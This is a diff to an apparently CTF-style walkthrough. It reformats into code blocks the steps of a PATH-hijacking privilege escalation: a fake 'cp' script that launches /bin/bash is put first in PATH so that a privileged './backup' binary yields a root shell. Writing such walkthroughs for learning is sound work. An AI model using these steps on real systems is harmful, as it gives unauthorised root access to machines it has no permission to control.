@@ -186,19 +186,27 @@ echo $PATH:
 So:
 
 Create the new `cp` file:
-`echo "/bin/bash" > cp`
+```
+echo "/bin/bash" > cp
+```
 
 Give execution permission:
-`chmod +x cp`
+```
+chmod +x cp
+```
 
 Put this folder first into the `PATH` environment variables:
-`export PATH=$PWD:$PATH`
+```
+export PATH=$PWD:$PATH
+```
 
 Execute the command:
-`./backup`
+```
+./backup
+```
 
 ![](https://github.com/user-attachments/assets/ee3846c6-f848-43c4-8d29-414418c82a61)
 
-Congratulations! You are now root :)
+You are now root!
 
 
